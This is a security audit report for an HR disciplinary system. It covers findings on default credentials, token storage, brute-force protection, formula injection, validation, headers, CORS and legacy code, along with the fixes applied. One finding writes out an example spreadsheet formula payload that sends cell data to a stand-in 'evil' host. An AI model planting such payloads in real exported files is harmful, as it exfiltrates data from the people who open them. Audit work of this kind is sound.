# Security Audit Report — HR Disciplinary System (Travel Gate KSA)

**Date:** 2026-06-09
**Scope:** Active codebase — `backend/app/` (FastAPI + SQLite) and `frontend/src/` (React + Vite).
The legacy `production/` tree and root `main.py` (Streamlit) are superseded; they were reviewed only for residual risk (see F-17, F-18).
**Baseline commit:** `847b5b5` — file/line references point at the code *before* the fixes in this branch.

## Summary

| Severity | Found | Fixed in this branch | Mitigated / Deferred |
|---|---|---|---|
| Critical | 2 | 1 | 1 (mitigated, full fix in Phase 2) |
| High | 4 | 3 | 1 (deferred to Phase 2) |
| Medium | 12 | 10 | 2 |
| Low | 4 | 3 | 1 |

Reviewed with no findings: SQL injection (all queries parameterised; the f-string in
`violations.py` interpolates only constant clause strings), XSS in the active React app
(no `dangerouslySetInnerHTML` / `innerHTML` / `eval`; React auto-escapes all rendered user
content; proof images are rendered as non-executing `data:` URLs), sensitive data in
`console.*` (none present), secrets in the committed SQLite DB (`*.db` is gitignored and
not tracked).

---

## Critical

### F-1 — Default admin credentials (`hr` / `admin123`) ✅ FIXED
- **File:** `backend/app/auth.py:7-8`
- **Exploit:** If `HR_ADMIN_PASSWORD` is unset (fresh deploy, mis-configured Railway service), the API silently accepts `hr`/`admin123`. The default is also published in `HANDOVER.md`, so any reachable deployment is one curl away from full read/write/delete of all HR records.
- **Fix applied:** Fail closed. With no `HR_ADMIN_PASSWORD_HASH` and a missing/known-default `HR_ADMIN_PASSWORD` (`admin123`, `admin`, `password`, `changeme`, empty), every authenticated request returns **503 "Authentication is not configured"** and an error is logged at startup. **Deployment note: this is a breaking change — local dev and Railway must now set a real password (or hash).**

### F-2 — Credentials persisted in `localStorage` ✅ FIXED (Phase 2: httpOnly cookie sessions; no credential ever touches web storage)
- **File:** `frontend/src/api.js:4-10`
- **Exploit:** The Basic-auth token (`btoa(user:pass)` — i.e. the plaintext password, reversibly encoded) was stored in `localStorage`, which survives forever, is shared across tabs, and is readable by any JS that ever executes in the origin (XSS, malicious browser extension, shared workstation).
- **Fix applied:** Moved to `sessionStorage` (cleared on tab close, not shared across tabs). This shrinks the exposure window but a credential in any web storage is still XSS-readable. **The real fix — httpOnly cookie sessions — is the core of Phase 2.**

## High

### F-3 — No rate limiting / brute-force protection on auth ✅ FIXED
- **File:** `backend/app/auth.py` (whole module); exercised via `/api/auth/check` (`backend/app/main.py:37-39`)
- **Exploit:** Unlimited password guesses against a single well-known username (`hr`). A throwaway script brute-forces a weak password in minutes; nothing is even logged.
- **Fix applied:** Per-client-IP lockout — 5 failed attempts within 15 minutes returns **429** (with `Retry-After`) for 15 minutes. Failed attempts are logged with username and source IP. In-memory by design (single uvicorn process + SQLite); must move to a shared store if the app is ever scaled out.

### F-4 — Password compared/stored in plaintext, no bcrypt/argon2 ✅ FIXED (Phase 2: per-user bcrypt hashes in the `users` table)
- **File:** `backend/app/auth.py:7,15`
- **Exploit:** The admin password lives in plaintext in env config and process memory of every environment (CI, Railway dashboard, shell history via `HANDOVER.md`'s `$env:HR_ADMIN_PASSWORD=...` instructions). Anyone with read access to the environment owns the system.
- **Fix applied:** New `HR_ADMIN_PASSWORD_HASH` env var (bcrypt, takes precedence over the plaintext var) verified with `bcrypt.checkpw`. Generate with:
  `python -c "import bcrypt; print(bcrypt.hashpw(b'your-password', bcrypt.gensalt()).decode())"`
  Phase 2 replaces this entirely with per-user bcrypt-hashed credentials in the DB.

### F-5 — Excel formula injection in report export ✅ FIXED
- **File:** `backend/app/routers/violations.py:160-166`
- **Exploit:** `comment` and `submitted_by` are free text echoed into `.xlsx` cells. openpyxl types a string starting with `=` as a *formula*, so a violation logged with comment `=HYPERLINK("http://evil/?"&A1, "open")` (or worse, a DDE payload) executes when HR opens the exported report — code execution / data exfiltration on the HR workstation.
- **Fix applied:** All free-text cells are passed through `_xlsx_safe()`, which prefixes a `'` when the value starts with `=`, `+`, `-`, `@`, tab, or CR.

### F-6 — Single shared account: no RBAC, no horizontal/vertical separation, no audit trail ✅ FIXED (Phase 2: 4 roles, scoped queries, per-user identity on every violation)
- **Files:** `backend/app/auth.py` (one credential), `backend/app/routers/violations.py:127-130` and `employees.py:36-39` (unrestricted DELETE)
- **Exploit:** Every user is the same super-admin. Anyone with the shared password can delete violations/employees with no record of *who* did it (`submitted_by` is free text — trivially spoofable). Privilege-escalation review is moot until roles exist.
- **Status:** This is precisely the Phase 2 deliverable (per-user accounts, HR Manager / HR Officer / Department Head / Employee roles, protected routes, audit-friendly identity). Interim: failed logins are now logged; deletes remain admin-gated.

## Medium

### F-7 — No server-side limit or validation on `proof_image` ✅ FIXED
- **File:** `backend/app/schemas.py:22` (`proof_image: str = ""`); 5 MB check existed only client-side (`frontend/src/pages/LogViolation.jsx:31`)
- **Exploit:** Direct POSTs bypass the UI check; arbitrary multi-hundred-MB base64 strings (or non-image garbage) bloat the SQLite file until the disk fills — denial of service.
- **Fix applied:** Pydantic-enforced cap of 7,200,000 base64 chars (≈ 5 MB binary) plus strict base64 validation. (Moving images out of the DB to file storage remains on the known-issues list.)

### F-8 — No email format validation ✅ FIXED
- **File:** `backend/app/schemas.py:7,9` (`email: str`, `manager_email: str = ""`)
- **Exploit:** Garbage or header-injection-shaped values (`a@b\nBcc: ...`) are stored verbatim; dangerous once the email-notification feature sends to these addresses.
- **Fix applied:** `email` is now `EmailStr` (via `email-validator`); `manager_email` allows empty or a syntactically valid address.

### F-9 — Raw database errors echoed to clients ✅ FIXED
- **File:** `backend/app/routers/employees.py:32-33` (`raise HTTPException(400, str(e))`)
- **Exploit:** sqlite exception text (table names, constraint names, file paths) leaks schema details that aid further attacks.
- **Fix applied:** Generic `"Could not save employee"` to the client; full exception logged server-side.

### F-10 — Unbounded text inputs ✅ FIXED
- **File:** `backend/app/schemas.py` (all string fields)
- **Exploit:** Megabyte-sized `comment`/`name` values inflate the DB and every list response.
- **Fix applied:** `max_length` on every field (names 120, comment 2000, etc.); names stripped of whitespace.

### F-11 — `override_days` unbounded ✅ FIXED
- **File:** `backend/app/schemas.py:24`
- **Exploit:** A typo (or malice) records a `1e308`-day deduction; negative values were filtered but huge ones flowed into payroll-relevant records.
- **Fix applied:** Constrained to `0 ≤ override_days ≤ 365`.

### F-12 — Missing security response headers ✅ FIXED
- **File:** `backend/app/main.py`
- **Exploit:** No `X-Content-Type-Options` (MIME sniffing), no `X-Frame-Options` (clickjacking), no `Cache-Control` on API responses (HR data cached by shared proxies/browsers), no HSTS.
- **Fix applied:** Middleware adds `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`, `Cache-Control: no-store` on `/api/*`, and HSTS when served over HTTPS.

### F-13 — CORS wildcard methods/headers with credentials ✅ FIXED
- **File:** `backend/app/main.py:27-28` (`allow_methods=["*"], allow_headers=["*"]` with `allow_credentials=True`)
- **Exploit:** Origins were already allow-listed (good), but any method/header was reflected, giving an allow-listed-but-compromised origin maximal room.
- **Fix applied:** Restricted to `GET, POST, DELETE` and `Authorization, Content-Type`.

### F-14 — Vulnerable dev dependency: esbuild ≤ 0.24.2 via Vite 5 ✅ FIXED
- **File:** `frontend/package.json`
- **Exploit:** GHSA-67mh-4wv8-2f99 — any website can send requests to the Vite *dev server* and read responses (dev-time source/code exfiltration). Moderate, dev-only.
- **Fix applied:** Upgraded to `vite@^7` + `@vitejs/plugin-react@^5`; `npm audit` now reports **0 vulnerabilities**; production build verified.

### F-15 — Unused PostgreSQL drivers in requirements ✅ FIXED
- **File:** `backend/requirements.txt:5-6` (`psycopg2-binary==2.9.9`, `asyncpg==0.29.0`)
- **Risk:** Dead supply-chain surface; both pinned to ageing versions, neither imported anywhere.
- **Fix applied:** Removed (added `bcrypt`, `email-validator` for F-4/F-8).

### F-16 — `secrets.compare_digest` crashes on non-ASCII passwords ✅ FIXED
- **File:** `backend/app/auth.py:14-15`
- **Exploit:** The `str` form of `compare_digest` raises `TypeError` on non-ASCII input, so a login attempt containing e.g. Arabic characters produced an unhandled 500 (error-page noise, log spam, and an oracle distinguishing it from a plain 401).
- **Fix applied:** Both operands are UTF-8 encoded to bytes before comparison.

### F-17 — Legacy code trees with their own vulnerabilities still in the repo ⏳ DEFERRED (needs your approval to delete)
- **Files:** `production/` (old FastAPI backend + single-file frontend), root `main.py` (Streamlit app), `hr-system (1).html`, `index.html`, `HR_Report.html`
- **Risk:** The legacy frontend builds DOM via `innerHTML` template literals (XSS sinks), stores a bearer token in `localStorage`, and the Streamlit app does plaintext password comparison (`main.py:1307`). None of it is deployed, but it's an attractive footgun (someone redeploys it) and noise for every future audit.
- **Recommendation:** Delete the legacy trees and generated artifacts from the repo (history stays available in git). Not done in this branch — destructive and outside stated scope.

### F-18 — Historical secret leak: Gmail SMTP app password ⚠️ VERIFY ROTATION
- **Reference:** `HANDOVER.md:147` records that `production/backend/.env` containing a real Gmail app password was once committed.
- **Status:** Verified the file is **not** in the working tree nor anywhere in this clone's git history (already purged). Residual risk is the credential itself: **confirm the Gmail app password was rotated**; purging history does not un-leak a secret that was ever pushed.

## Low

### F-19 — Login form pre-fills the valid admin username ✅ FIXED
- **File:** `frontend/src/pages/Login.jsx:11` (`useState("hr")`)
- **Exploit:** Halves the brute-force problem by handing every visitor the valid username.
- **Fix applied:** Empty default; proper `autoComplete="username"` / `"current-password"` attributes added (password managers, no accidental autofill into wrong fields).

### F-20 — Unvalidated date filters ✅ FIXED
- **File:** `backend/app/routers/violations.py:49-54`
- **Risk:** Not injectable (parameterised), but malformed dates silently produced wrong report results — an integrity issue for disciplinary records.
- **Fix applied:** `date_from`/`date_to` must match `YYYY-MM-DD` or the API returns 400 (applies to list and export).

### F-21 — CSRF ✅ FIXED (Phase 2: SameSite=Lax cookies + double-submit token required on every mutation)
- Auth is an `Authorization` header attached explicitly by JS, never auto-sent by the browser, so cross-site request forgery has no vector today. **When Phase 2 moves to httpOnly cookies, CSRF defenses (SameSite=Lax/Strict + token or double-submit) are mandatory** — flagged here so it cannot be forgotten.

### F-22 — Fonts loaded from Google CDN at runtime ⏳ DEFERRED
- **File:** `frontend/src/App.jsx:115`
- **Risk:** Third-party runtime dependency leaks user IPs to Google, blocks a strict CSP, and breaks offline/intranet use. Recommend self-hosting the two font families (Phase 3, with the rest of the UI work).

---

## Recommended next steps
1. **Phase 2 (approved scope):** real auth module — per-user accounts with bcrypt, the four roles, httpOnly-cookie sessions + CSRF protection, lockout per account, password reset, logout. F-2 and F-6 close fully there.
2. **Rotate the leaked Gmail app password** if it hasn't been (F-18).
3. **Approve deletion of the legacy trees** (`production/`, root `main.py`, stray HTML/xlsx artifacts) — F-17.
4. Set `HR_ADMIN_PASSWORD_HASH` (preferred) on Railway and for local dev — the server now refuses default/empty credentials by design.
5. Move proof images out of SQLite into file/object storage (existing known issue; also shrinks backup/exfiltration blast radius).
6. Add an audit log table (who logged in, who deleted what) once per-user identity exists.
